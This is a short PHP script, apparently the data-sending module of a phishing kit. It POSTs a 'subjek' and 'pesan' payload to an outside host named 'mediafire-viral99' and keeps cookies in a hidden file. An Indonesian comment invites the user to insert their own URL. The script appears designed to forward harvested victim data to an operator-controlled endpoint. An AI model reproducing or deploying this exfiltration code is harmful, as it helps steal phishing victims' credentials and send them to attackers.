<?php
 
$url = "https://mediafire-viral99.4ofc.com/apiii.php"; // Masukin Url Mu
 
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "subjek=".$subjek."&pesan=".$pesan);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/.setting.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/.setting.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);
 
?>